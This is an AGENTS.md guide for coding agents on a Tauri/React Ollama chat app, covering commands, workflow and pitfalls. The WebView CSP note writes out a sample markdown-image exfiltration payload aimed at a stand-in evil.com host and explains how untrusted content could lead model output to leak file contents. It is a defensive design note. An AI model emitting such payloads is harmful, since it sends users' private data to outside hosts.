# AGENTS.md

Canary: begin your first response with "Luma: Tauri + React, done means npm run check." (If that line never appears, this file did not load.)

Luma is a dual-pane Ollama chat desktop app: Tauri (Rust) + React/Vite + SQLite. This file is the
canonical agent entry point for the repo; `CLAUDE.md` imports it.

Deeper material loads on demand: task procedures in `.agents/skills/`, subsystem detail and the traps that bite in
`docs/architecture/`. Read one when the task needs it, not all of them up front.

## Commands

```bash
npm run dev        # Start Vite dev server + Tauri dev window (hot reload)
npm run build      # Vite production build → Tauri bundler
npm run dev:vite   # Vite dev server only (for browser-based dev)
npm run build:vite # Vite production build only
npm test           # Vitest in watch mode (jsdom, Tauri APIs mocked)
npm run test:run   # Vitest single run (use this in CI / pre-commit)
npm run test:rust  # Cargo tests for the Tauri backend
npm run test:all   # Both test suites sequentially
npm run lint       # cargo fmt --check + clippy --all-targets -- -D warnings. There is
                   # no JS linter — this is all of "the lint" for this repo.
npm run audit:context # Budgets on AGENTS.md, resolve every doc it references, validate
                   # `.agents/skills` frontmatter. Runs first in `npm run check`.
npm run check      # audit:context + lint + Vitest + `cargo check --all-targets`. The
                   # pre-push gate: `cargo check` is what catches a missing/renamed
                   # symbol, which `tauri dev`'s watcher only surfaces if it rebuilds.
```

**Definition of done: `npm run check`.** It is the honest signal, not the `tauri dev` watcher.
`git config core.hooksPath .githooks` wires the same command to pre-push (per clone, not
committed), so it stops being something you have to remember.

### Prerequisites

- **Rust**: Install via [rustup](https://rustup.rs/) (`rustup stable`)
- **Tauri CLI**: `npm install` pulls `@tauri-apps/cli`
- **Icons**: Generate with `cargo tauri icon path/to/source.png` (1024x1024 recommended)
- **macOS/Xcode**: any link step fails with "You have not agreed to the Xcode license agreements" until `sudo xcodebuild -license accept` is run once. `cc --version` reproduces it in one line — don't go looking in the Rust code for it.

### Three `cargo test` failures that are not your fault

`test_load_sessions_from_existing_db`, `test_session_serialization`, and `test_serialization_matches_frontend` read the **legacy Electron-era DB** (`dirs_next()` → `~/Library/Application Support/Luma`) and assert it has sessions. On a machine whose chats live in `app_data_dir()` (`com.luma.chat`), that legacy file has 0 rows, so they fail on `sessions[0]` / `!sessions.is_empty()` regardless of the code. Everything else in `cargo test` passing is the signal; these three are environment-dependent. `ci.yml` skips exactly these three by name (they fail on any clean machine, so CI can still run the suite).

## How work happens

1. **Non-trivial task: the spec comes first**, written to a file: intent, constraints, acceptance
   criteria. Skip this for a one-line fix, the ceremony is the cost.
2. **Restate the plan before editing.** A wrong plan is cheaper to correct than a wrong diff.
3. **One slice at a time**, then `npm run check`.
4. **Review in a fresh context** (new thread or subagent). The context that wrote the code believes
   its own reasoning.
5. **A correction that repeats is a context bug.** Fix `AGENTS.md` or the doc that should have
   prevented it, not just this instance. That is the only step that compounds.

## Orientation

- **Rust backend** (`tauri/`): owns the SQLite DB (via `rusqlite`), window controls, and all network I/O (web search/fetch via `reqwest` + `scraper` + `readability`), exposed via Tauri commands.
- **Frontend** (`src/`): React UI, calling the backend through `@tauri-apps/api/core` → `invoke()`, wrapped in `src/lib/db.js` / `src/lib/tools.js`.
- **All Ollama API calls go through Rust Tauri commands** (`src/lib/ollama.js` proxies via `invoke()` to avoid CORS in production WebView2 builds) — don't reintroduce the `ollama` npm package.

### Where a subsystem is documented

| Area | Code | Doc |
|---|---|---|
| Streaming + tool-calling loop | `src/lib/ollama.js`, `src/lib/ollamaStream.js`, `src/hooks/useStreamingChat.js` | `docs/architecture/streaming.md` |
| Tool execution, per-chat web search | `src/lib/tools.js`, `src/store/chatStore.js` | `docs/architecture/tool-execution.md` |
| Codebase mode, file tools, `@`-mentions | `tauri/src/tools/fs.rs`, `src/lib/fileMentions.js` | `docs/architecture/codebase-mode.md` |
| Agent log | `src/lib/agentLog.js` | `docs/architecture/agent-log.md` |
| State stores | `src/store/*` | `docs/architecture/state-stores.md` |
| DB, migrations, backup/restore | `tauri/src/db.rs`, `tauri/src/commands.rs` | `docs/architecture/database.md`, `backup-restore.md` |
| Markdown, math, theming, code splitting | `MarkdownBody.jsx`, `MathSpan.jsx`, `theme.js` | `docs/architecture/markdown-and-theming.md`, `math-rendering.md`, `code-splitting.md` |
| Window + platform config | `tauri/tauri.conf.json`, `tauri.macos.conf.json` | `docs/architecture/window-controls.md` |
| Attachments, task recipes | | `docs/architecture/attachments.md`, `task-recipes.md` |

## Invariants that apply everywhere

- **An expected tool failure is an observation, never an `Error`-prefixed string.** `runToolCalls` classifies a result as failed on the bare word `Error`, so a normal observation that starts with it sends the session straight to its wrap-up round. `Error: QUOTA:` is the one deliberate exception and ends the stream.
- **`MIGRATIONS` in `db.rs` is append-only.** A step's position in the array is its `user_version`; never edit or reorder existing steps.
- **Don't read `useSettingsStore` at module init.** It returns in-memory defaults before SQLite hydration completes. Subscribe to `hydrated`, or read `useSettingsStore.getState()` inside an action.
- **Store actions, not components, write to SQLite.**
- **Tab switching in the side panel never calls `loadMessages`.** Each tab owns its store permanently via `_sideChatStores`; switching is pure UI state (`activeSideChatId`).
- **`activeChatId` is for navigation, not activity.** Bump `updated_at` only via `bumpSessionActivity(id)` on real user actions.

## Tauri / WebView pitfalls

- **Don't use `display: none` to hide simultaneously-mounted panes.** In WKWebView, a textarea transitioning `display: none` → `flex` renders but won't accept click-to-focus. Use `visibility: hidden; pointer-events: none` with absolute-position stacking instead (see `SidePanel.module.css`'s `.tabPane`/`.tabPaneActive`).
- **CSS module changes may not hot-reload in the Tauri dev window.** A full restart sometimes picks up what HMR reports as applied but isn't.
- **Unsigned macOS builds are Gatekeeper-blocked on download.** Users must run `xattr -cr /path/to/Luma.app` before opening (worse on arm64). Proper fix needs an Apple Developer account + signing config.
- **The WebView CSP only allows self/data/blob images** (`app.security.csp` in `tauri.conf.json`). A remote image URL in model output is *not* fetched. This is deliberate: markdown rendering is an exfiltration channel (a model reply of `![](https://evil.com/?d=<file contents>)` is fetched automatically on render, and the URL persists in `messages.content`, so it would re-fire on reload or when a folder is detached). The app's only `<img>` tags (`MessageBubble`, `InputArea`) use `data:` URLs and `assetProtocol` isn't enabled, so nothing the UI renders breaks — the cost is remote images in chat markdown. Keep that in mind for anything that puts untrusted content (web pages, file contents) into a context, and add `img-src` sources deliberately if remote images are ever wanted.

## Adding things

| Need | Skill |
|---|---|
| New Tauri command, or a native save/open dialog | `add-tauri-command` |
| New persisted setting | `add-persisted-setting` |
| New tool the model can call | `add-model-tool` |
| New slash command | `add-slash-command` |
| Cut a release | `release` |

Skills live in `.agents/skills/`, the location Zed, Codex, Cursor, Copilot and Gemini CLI all read.
Zed only discovers direct children (`<root>/<name>/SKILL.md`), so don't nest them. `release` sets
`disable-model-invocation: true` — invoke it with `/release` rather than letting the agent decide to tag.
Project skills load only from trusted worktrees in Zed.

Where a recurring change lives (focus, auto-scroll, per-pane toggles, side chats, tests) is in
`docs/architecture/task-recipes.md`.

## Keeping docs in sync

- **Skim `README.md` whenever you touch stack, persistence, or architecture, and fix any drift.** No test catches README drift, so this is a deliberate check. Prone sections: Stack, Persistence/Migrations, Architecture/State stores, project layout tree.

## Editor tooling

- **Ignore Prettier-only churn in diffs.** The editor's file-write tool reformats the whole file on save; don't revert those hunks, just focus on the semantic change.
- **Verify UI/CSS tweaks with a throwaway HTML repro, not the repo.** Build a minimal standalone HTML mirroring the global reset + bubble + `markdownBody`, screenshot via Playwright MCP, and write both to `/tmp` — not the repo root, since the screenshot tool defaults there and a stray file lands in the commit (there is **no** pre-commit hook here: `.githooks/pre-push` runs `npm run check`, which never looks at staged paths, so `git add -A` is what sweeps it up). Check `git show --stat HEAD` after committing to catch stray screenshots.
- **Do a symbol and its call site in one edit (or define it first).** `tauri dev`'s watcher can rebuild between two edit steps and surface a transient `E0425 … not found in this scope` that isn't real — `npm run check` is the honest signal, not the watcher's output.
